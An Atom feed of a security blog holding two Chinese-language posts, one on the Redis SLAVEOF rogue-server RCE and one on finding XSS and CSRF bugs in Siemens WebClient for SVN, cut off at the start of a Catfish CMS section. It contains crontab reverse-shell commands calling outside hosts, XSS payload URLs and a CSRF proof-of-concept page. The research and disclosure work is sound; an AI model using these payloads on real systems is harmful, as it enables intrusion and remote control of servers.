<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FSEEEYE</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hducaiji.github.io/"/>
  <updated>2020-07-28T10:30:07.584Z</updated>
  <id>http://hducaiji.github.io/</id>
  
  <author>
    <name>fseeeye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis Slaveof Attack</title>
    <link href="http://hducaiji.github.io/2020/07/28/Redis-slaveof-attack/"/>
    <id>http://hducaiji.github.io/2020/07/28/Redis-slaveof-attack/</id>
    <published>2020-07-28T10:18:17.000Z</published>
    <updated>2020-07-28T10:30:07.584Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><p>当初，WCTF2019 Final赛后分享会上，<code>LC⚡️BC</code>战队成员公开的Redis主从攻击RCE激起了一波研究热潮。究其原因便是该攻击的普适性可以让所有4.x/5.x版本非授权访问的Redis无处遁形，本文就Redis攻击基础和Redis主从攻击作粗略讨论。</p><h1 id="PART1-Redis-basics"><a href="#PART1-Redis-basics" class="headerlink" title="PART1: Redis basics"></a>PART1: Redis basics</h1><p>在讲主从攻击之前，我们需要了解一些攻击相关的命令和通讯协议结构。</p><h2 id="Redis基础"><a href="#Redis基础" class="headerlink" title="Redis基础"></a>Redis基础</h2><p>Redis作为极其轻量化的数据结构存储媒介，让其成为很多场景的解决方案：</p><ul><li>序列化Session/Caching数据存储</li><li>PUB/SUB消息服务</li><li>异步任务队列的消息代理</li></ul><p>其命令也比常见数据库要简单很多：</p><ul><li>存储/获取键值型的数据: <code>set &lt;key&gt; &lt;value&gt;</code> &amp; <code>get &lt;key&gt;</code></li><li>修改/获取配置: <code>config &lt;get&gt; &lt;key&gt;</code> &amp; <code>config set &lt;key&gt; &lt;value&gt;</code></li><li>获取该Redis基本信息: <code>info</code></li><li>保存: <code>save</code></li><li>停止: <code>shutdown [save/nosave]</code><br>从简单的介绍中，读者也应该隐约理解Redis产品定位和其收到追捧的原因。不过，本文之意不在Redis入门，故不再赘述。</li></ul><h2 id="Redis协议分析"><a href="#Redis协议分析" class="headerlink" title="Redis协议分析"></a>Redis协议分析</h2><p>首先请试想一下，在Redis命令行中输入<code>SET a helloworld</code>这一串字符后，它会出现在网络数据包的什么地方，并以什么形式呈现呢？<br>其实，Redis的通讯协议比较简单，它是基于TCP，并将通讯内容明文传输，这有点类似于初学python编写的TCP聊天室一样简单，但是Redis添加了修饰符保证通讯稳定性和可靠性。<br>比如上文的字符串在TCP Payload中形如：<code>*3\r\n$3\r\nSET\r\n$1\r\na\r\n$10\r\nhelloworld\r\n</code>，读者略微思考一下就可以弄懂其逻辑结构: <code>*</code>号后的数字用于表示参数数量，<code>$</code>号后的数字用于表示参数长度，各具有单独意义的字符串通过CRLF分开。<br>而Redis对传入数据包的回复更加简单，通常采用<code>+</code>号后跟响应字符串（通常为OK），并以CRLF结尾，形如：<code>+OK\r\n</code>。</p><h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis 4.x之后，Redis可以通过添加C语言编译出的<code>.so</code>文件来为其自定义地添加新命令。模块有两种加载方式：</p><ol><li>在配置文件中MODULES板块下添加<code>loadmodule /path/to/my/module.so</code>，Redis便会启动时加载该模块。</li><li>通过<code>redis-cli</code>使用命令<code>module load /path/to/my/module.so</code>加载。</li></ol><p>加载的模块可以使用命令<code>module list</code>查看，使用MODULE UNLOAD mymodule卸载。<br>既然可以自定义新命令，那么有没有开发者实现执行系统命令的模块呢？答案是肯定的，该项目可编译出相关模块: <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><h1 id="PART2-Redis-SLAVEOF-Attack"><a href="#PART2-Redis-SLAVEOF-Attack" class="headerlink" title="PART2: Redis SLAVEOF Attack"></a>PART2: Redis SLAVEOF Attack</h1><h2 id="未授权Redis-Getshell"><a href="#未授权Redis-Getshell" class="headerlink" title="未授权Redis Getshell"></a>未授权Redis Getshell</h2><p>在主从攻击公布之前，我们针对未授权Redis主要采用crontab来getshell。大致操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span><br><span class="line">$ config set dbfilename root</span><br><span class="line">$ set 1 &quot;\n* * * * * &#x2F;usr&#x2F;bin&#x2F;python -c &#39;import socket,subprocess,os,sys;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot; </span><br><span class="line">or: $ cat foo.txt | redis-cli -h 10.133.1.79 -p 6379 -x set key  &amp;&amp;  echo &quot;\n* * * * *  bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;xxxx 0&gt;&amp;1\n&quot;&gt;&gt;foo.txt</span><br><span class="line">$ save</span><br></pre></td></tr></table></figure><p>思路是很好，通过更改备份目录和文件名，以写数据备份到<code>/var/spoof/cron/crontabs/root</code>中，完成写入定时项目。但是实际在Ubuntu测试中存在两个问题：</p><ol><li>crontab写入的root文件的权限必须为600，也就是<code>rw-------</code>，否则会出现<code>cron[53948]: (root) INSECURE MODE (mode 0600 expected)</code>。但是redis通过save保存的dbfile为644.</li><li>Ubuntu cron对于dbfile上下冗余数据容错不高，且我们写入的命令必被定位于文件中段，形似：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REDIS0009ú      redis-ver^E5.0.7ú</span><br><span class="line">redis-bitsÀ@ú^EctimeÂÜ)^H_ú^Hused-memÂP^X^M^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^A9</span><br><span class="line">* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.4.162&#x2F;9999 0&gt;&amp;1</span><br><span class="line">ÿ^Lþô&lt;8e&gt;S¨·¶</span><br></pre></td></tr></table></figure>导致cron出现报错：<code>bad minute; while reading crontab for user root</code> <code>ERROR (Syntax error, this crontab file will be ignored)</code>。</li></ol><p>以上原因导致就算我们遇见一台未授权Redis，且以root身份运行，我们可能也无法成功Getshell。（CentOS相比Ubuntu容错更高）</p><h2 id="SLAVEOF解析"><a href="#SLAVEOF解析" class="headerlink" title="SLAVEOF解析"></a>SLAVEOF解析</h2><p>Redis主从命令为<code>SLAVEOF</code> (但由于美国黑人运动的影响，将在后续版本使用<code>REPLICAOF</code>，本文暂且沿用<code>SLAVEOF</code>)，从该命令的两个名字来看，不难理解主从功能实质上就是复制(Replication)，使该Redis服务器变为另一指定IP和PORT的Redis服务器的复制。<br><code>SLAVEOF HOST PORT</code>为命令基本用法，相关注意事项如下：</p><ul><li>一台处于Slave状态的服务器，我们可以通过<code>SLAVEOF HOST PORT</code>使其重新选择一台Master作为其复制的来源。</li><li>我们可以通过使用<code>SLAVEOF NO ONE</code>来让一台处于Slave状态的服务器停止复制行为，重新作为一台独立的Master服务器。可见SLAVEOF命令初衷是作热灾备使用的。</li></ul><p>当然，我们更应该关注master向slave发送该命令后，它们之间发生了怎样的通信？了解了这些后我们就能轻易构造攻击。方便起见，我先把主从攻击中发生的通讯流程放上来，一条条分析：<br><img src="./slave-process.png" alt="slave-process"></p><ol><li><code>PING</code>命令用于测试某个连接是否存活，slave服务器会利用此命令来在发送同步信息前不停检测master是否存活，得到<code>+PONG</code>后开始进行下一步。</li><li><code>REPLCONF</code>命令从<a href="https://download.redis.io/redis-stable/src/replication.c" target="_blank" rel="noopener">Redis源码replication.c</a>的注释中可以得知其用途: <blockquote><p>This command is used by a slave in order to configure the replication process before starting it with the SYNC command.<br>Currently the only use of this command is to communicate to the master what is the listening port of the Slave redis instance, so that the master can accurately list slaves and their listening ports in the INFO output.<br>In the future the same command can be used in order to configure the replication to initiate an incremental replication instead of a full resync.</p></blockquote></li></ol><p>简单来说，它被用于在主从同步之前，slave先通过该命令交换自己的listening port等信息给master。master只要一直回复<code>+OK</code>直到下一命令出现即可。</p><ol start="3"><li><code>PSYNC &lt;replid&gt;</code>命令由官方文档<a href="https://redis.io/commands/psync" target="_blank" rel="noopener">PSYNC-Redis</a>可知，其用于向master请求生成一串replication stream以尝试部分同步数据(PSYNC = partial resynchronizations)。其参数为replication id，它是40字节的伪随机字符串，用于标记某一数据库，便于master判断slave与其当前存储的数据的差别，从而该从哪个偏移量复制起，或者完全重新复制。当然replication id标记数据也便于恢复。详见<a href="https://redis.io/topics/replication" target="_blank" rel="noopener">Redis Replication文档</a>，文档略长，适当学习即可。(部分文章提到的<code>SYNC</code>命令已在新版本被<code>PSYNC</code>取代，因为它不支持部分同步)</li><li><code>+FULLRESYNC &lt;replid&gt; &lt;offset&gt;</code>命令用于在master通过slave replid判断需要完全重新同步(FULLRESYNC = full resynchronization)后，通过该命令发送一串stream用来<strong>完全覆盖slave当前的dbfile！</strong>这点非常关键，说明我们通过该命令攻击将不用受到上文crontab getshell中一样遭受冗余字符对攻击的干扰 (当然也可通过slaveof改进上文crontab getshell攻击方法，读者可以自行验证在Ubuntu上的可行性)。其中<code>&lt;replid&gt;</code>使用任意40位的字符串即可，<offset>设为1，表示从dbfile开头开始覆盖，最后通过CRLF作分割，跟上覆盖的字符串长度和内容即可。</li></ol><h2 id="主从攻击思路与实现"><a href="#主从攻击思路与实现" class="headerlink" title="主从攻击思路与实现"></a>主从攻击思路与实现</h2><p><code>LC⚡️BC</code>的主从攻击在写入Payload方面与我们上文所讲的Getshell类似，通过更改数据备份文件名，然后控制写入内容，最后Redis/OS相关服务读取该文件达到RCE的目的。为了便于简单的验证，我们假设RCE场景为：</p><ul><li>目标服务器可与恶意服务器可双向通讯。</li><li>目标服务器上某端口开启Redis 4.x/5.x服务，可直接访问，且未授权/已知auth key。</li><li>对目标服务器Redis数据结构和其它信息均零了解。</li></ul><p>综合上文讨论的所有内容，那么我们可以编写一个攻击脚本，模拟恶意Redis服务器完成对目标Redis的攻击，流程如下：</p><ol><li>通过TCP连上目标Redis后，发送<code>slaveof</code>命令使其成为我们恶意服务器的slave。</li><li>获取目标Redis当前dbfile文件名和存储文件夹，并通过修改配置文件将dbfile文件名改为<code>xxx.so</code>。</li><li>监听恶意服务器的端口，程序模拟主从同步过程，<code>+FULLRESYNC</code>末尾字符串使用实现编译好的<code>.so</code>文件的HEX，从而写入模块进目标服务器。</li><li>发送命令使目标Redis动态加载刚写入的模块。</li><li>使用模块创建的新命令以远程执行系统命令，达到RCE的目的。</li><li>unload并删除模块，将dbfile文件名重置为原先的名称。</li><li>断开连接。</li></ol><p>通过以上思路，参考<a href="https://github.com/Dliv3/redis-rogue-server" target="_blank" rel="noopener">Dliv3的python3 EXP</a>，fork修改后成为如下项目: <a href="https://github.com/we08guyy/redis-rogue-server%EF%BC%8C%E8%BF%90%E8%A1%8C%E6%88%AA%E5%9B%BE%E5%A6%82%E4%B8%8B%EF%BC%9A" target="_blank" rel="noopener">https://github.com/we08guyy/redis-rogue-server，运行截图如下：</a><br><img src="./redis-rogue-server.png" alt="redis-rogue-server"><br>运行前输入目标和攻击机ip&amp;port，以及<code>.so</code>文件名后等信息后，运行成功将会返回一个可交互的类命令行。读者可以通过浏览源码加深对主从攻击的理解。</p><h1 id="Afterword"><a href="#Afterword" class="headerlink" title="Afterword."></a>Afterword.</h1><p>主从攻击本质上来说，就是对Redis协议的攻击。由于其协议过于简单(无加密/无身份认证/协议结构简单/开源)，导致其主从通讯被恶意利用，通过写文件加远程执行Redis命令最终达到了RCE的目的。有兴趣的读者可以研究Redis 6.x版本对相关问题的改进方案，也欢迎与作者交流、探讨。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></li><li><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a></li><li><a href="https://redis.io/commands/slaveof" target="_blank" rel="noopener">https://redis.io/commands/slaveof</a></li><li><a href="https://redis.io/topics/replication" target="_blank" rel="noopener">https://redis.io/topics/replication</a></li><li><a href="https://download.redis.io/redis-stable/src/replication.c" target="_blank" rel="noopener">https://download.redis.io/redis-stable/src/replication.c</a></li><li><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;The-foregoing&quot;&gt;&lt;a href=&quot;#The-foregoing&quot; class=&quot;headerlink&quot; title=&quot;The foregoing.&quot;&gt;&lt;/a&gt;The foregoing.&lt;/h1&gt;&lt;p&gt;当初，WCTF2019 Final赛后分享会上，
      
    
    </summary>
    
    
    
      <category term="WEB" scheme="http://hducaiji.github.io/tags/WEB/"/>
    
      <category term="Redis" scheme="http://hducaiji.github.io/tags/Redis/"/>
    
      <category term="Vuln" scheme="http://hducaiji.github.io/tags/Vuln/"/>
    
  </entry>
  
  <entry>
    <title>近期的CVE挖掘总结</title>
    <link href="http://hducaiji.github.io/2020/06/01/mycve1/"/>
    <id>http://hducaiji.github.io/2020/06/01/mycve1/</id>
    <published>2020-06-01T07:19:12.000Z</published>
    <updated>2020-06-01T07:31:57.279Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><p>现今，工业领域随时代潮流所需，工控厂商逐渐需要Web应用程序满足业务服务、设备管控需求，以解放人力，而Web应用程序面临的最大问题就是来自网络的黑客攻击。针对本月工作内挖的两个应用程序漏洞，漫谈想法和经验。</p><p>#PART1: Siemens WebClient for SVN</p><h2 id="环境描述与搭建"><a href="#环境描述与搭建" class="headerlink" title="环境描述与搭建"></a>环境描述与搭建</h2><p>该Web应用程序属于西门子the Polarion Community方案中的产品，用于解决subversion(SVN)数据在线迁移和管理的应用。SVN是一种开源版本控制系统，主要用于管理、存储、恢复实时变化的数据，类似于数据的git工具，可适用于针对工控行业底层设备数据的存储与维护。本文采用漏洞应用程序与依赖环境如下：</p><blockquote><ul><li>Siemens WebClient for SVN 最新版本 3.1.0: <a href="https://polarion.plm.automation.siemens.com/products/svn/svn_webclient" target="_blank" rel="noopener">https://polarion.plm.automation.siemens.com/products/svn/svn_webclient</a></li><li>SVN：VisualSVN Server for Windows (在svn webclient中设置ParentRepositoryDirectory以管理多个SVN仓库，测试仓库名为test)</li><li>Web应用服务器：Tomcat</li><li>测试浏览器：Chrome</li><li>测试主机系统：macOS Catalina</li></ul></blockquote><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>具本人对工控行业相关产品/服务近几年CVE的阅读，只要与Web相关的CVE，XSS占据绝大比例。像这类从changes.txt就能看出年代相对较早的Web应用，更可先从XSS考量，尝试性地进行漏洞挖掘工作。<br>先谈谈挖掘手法，很多师傅还秉持着先直接输入类似<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>或加入更多前缀的payload查看是否弹框的方式来判断XSS的生成。个人认为，这是相当浪费手工测试效率的做法，除非您集成了大量高级payload并做成自动化测试。无论是白盒还是黑盒挖掘，我们虽然是手工测试，但是可以参考自动化工具的实现思路来提高挖掘效率和成功率。普通的XSS自动化，在爬虫实现和确认过滤后通常会在参数点放置随机字符串，然后在服务器响应报文中定位随机字符串在其中出现的位置来判断应该如何构造payload。那么在手工中，我们可以先跳过需要大量工作的检查过滤，直接先输入随机字符串，针对出现位置尝试构造payload测试，下文中便采用这种手法。</p><h3 id="first-vuln"><a href="#first-vuln" class="headerlink" title="first vuln"></a>first vuln</h3><ul><li>登陆后，通过观察该应用的功能，不难发现应用存在添加文件夹的功能：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory.png" alt="add-directory">输入文件夹名称和说明后，并不会直接跳转，而是会展示成功界面：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory-success.png" alt="add-directory-success">且其URL始终定位在<code>directoryAdd.jsp?location=test&amp;url=</code>上，可以尝试对url添加参数测试。</li><li>按照开头的想法，我们在提交参数中输入随机字符串<code>directoryAdd.jsp?location=test&amp;url=wpd3dGY</code>，定位参数出现的位置：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss1.png" alt="xss1">从结果中我们发现几处感兴趣的注入点，一个个进行测试即可。我们针对图中四处进行挨个测试。</li><li>第一处需要脱离出双引号，但是应用直接复制URL进入href中，无法注入双引号。第二处存在于a标签包裹中，构建payload如下<code>directoryAdd.jsp?location=test&amp;url=wpd3dGY%3a%2fa%3e%3ascript%3ealert(1)%3a%2fscript%3e</code>，发现应用直接过滤script标签以及包裹的内容，猜想对于常见XSS标签均会过滤，先进行下一处测试，此处留待后续。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss2.png" alt="xss2"></li><li>第三处直接位于script标签中，并不需要输入标签就可能实现XSS。payload如下：<code>%22,%20%22location=x%22);alert(1);//</code>，发现payload完成插入，转向浏览器发现成功alert。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss3.png" alt="xss3"><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss4.png" alt="xss4"></li></ul><h3 id="second-vuln"><a href="#second-vuln" class="headerlink" title="second vuln"></a>second vuln</h3><ul><li>继续观察该应用功能，视线关注到添加文件更新功能，其存在于点选某存储在SVN的文件后。引起我注意的是，它的URL中依旧类似添加文件夹的功能，存在一个url参数，用于设定需要更新的文件名。</li><li>尝试前一处漏洞的payload，依旧可以成功执行:<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss5.png" alt="xss5"></li><li>我们可以按照之前的思路，看看有没有新的问题出现，可以注意到这次的matches多出了一处，是一个hidden的input标签。虽然它依旧需要我们写入标签，但不需要a标签闭合，也不是复制URL进值中，可以逃逸双引号。既然如此，我们继续尝试构造payload，观察其不能够过滤何种标签。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss6.png" alt="xss6"></li><li>测试到img标签后，发觉写入成功，成功挖掘到另一个XSS，payload如下：<code>fileUpdate.jsp?location=test&amp;url=wpd3dGY%22%3E%3Cimg%20src=a%20onerror=alert(1)%3E</code><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss7.png" alt="xss7"></li></ul><p>该应用中依旧存在多处XSS，供读者按照思路动手实践。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>对于CSRF漏洞，我们挖掘时应该更换一种思路——从漏洞的防御上思考。为什么普遍采用这种思路呢？因为目前CSRF防御思路非常简单，除了不太通用的检查HTTP Refer是否同域，一般采用验证码、一次性token等在使用关键功能时，验证用户身份。我们只要在浏览Web应用是否实现了这种防御措施，即可初步判断其是否存在CSRF漏洞，很自然的，svn webclient并没有做到这一点，我们可以通过创建恶意站点，又到用户访问后即可在其不知情的情况下做到插入文件、新建文件夹等。</p><ul><li>在我们创建恶意站点前，需要先用BurpSuite等工具拦截数据包，了解其传输数据构成。如插入一个名为<code>csrf.html</code>文件的HTTP请求内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;svnwebclient&#x2F;fileAddAction.jsp?location&#x3D;test&amp;url&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.0.0.2:8080</span><br><span class="line">Content-Length: 307</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;10.0.0.2:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;81.0.4044.138 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.0.0.2:8080&#x2F;svnwebclient&#x2F;fileAdd.jsp?location&#x3D;test&amp;url&#x3D;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,la;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;915759257D068C82D0F4B17741A1208A; DirectoryContentSortField&#x3D;name; DirectoryContentSortOrder&#x3D;asc</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filepath&quot;; filename&#x3D;&quot;csrf.html&quot;</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">xxxx</span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;comment&quot;</span><br><span class="line"></span><br><span class="line">File was added remotely</span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI--</span><br></pre></td></tr></table></figure></li><li>根据其内容，我们可以创建一个通过点击在svn中插入<code>csrf.html</code>文件的恶意站点：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/&lt;HIDDEN&gt;\/svnwebclient\/fileAddAction.jsp?location=&lt;LOCATION&gt;&amp;url="</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=----WebKitFormBoundaryFqGs6aNB3pRkk9TY"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.9,en;q=0.8,la;q=0.7"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"filepath\"; filename=\"csrf.html\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: text/html\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="handlebars"><span class="xml">          "\x3c<span class="symbol">&amp;#105;</span>MG SRC=<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>\x3e\n" + </span></span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"comment\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"File was added remotely\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line">          aBody[i] = body.charCodeAt(i); </span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>之后，登陆应用后访问该HTML并点击按钮就可以观察到svn已被插入新文件：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/csrf.png" alt="csrf"></li></ul><h1 id="PART2-Catfish-CMS"><a href="#PART2-Catfish-CMS" class="headerlink" title="PART2: Catfish CMS"></a>PART2: Catfish CMS</h1><p>工控厂商为了通常需要创建一个官方站点，提供企业信息、新闻、招聘。出于技术原因和开发成本的考量，通常会选用在CMS开发官网。该实例就从CMS的源码审计角度来提供CMS漏洞挖掘的参考。本文采用漏洞应用程序与依赖环境如下：</p><blockquote><ul><li>Catfish CMS 4.9.2: <a href="http://www.catfish-cms.com/" target="_blank" rel="noopener">http://www.catfish-cms.com</a></li><li>Web应用服务器: Catfish官方提供的集成环境 <a href="http://www.catfish-cms.com/page/17.html" target="_blank" rel="noopener">http://www.catfish-cms.com/page/17.html</a></li><li>测试浏览器：Chrome</li><li>测试主机系统：macOS 